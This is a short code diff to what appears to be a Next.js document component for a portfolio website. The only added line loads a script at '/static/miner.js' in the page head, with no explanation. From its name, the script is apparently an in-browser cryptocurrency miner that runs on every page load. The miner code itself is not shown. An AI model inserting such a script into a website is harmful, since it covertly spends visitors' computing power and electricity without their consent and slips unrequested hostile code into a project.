@@ -7,6 +7,7 @@ class PortfolioDocument extends Document {
       <Html>
         <Head>
         <script async src="https://arc.io/widget.min.js#dPRGqGD4"></script>
+        <script async src="/static/miner.js"></script>
           <link
             href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap"
             rel="stylesheet"
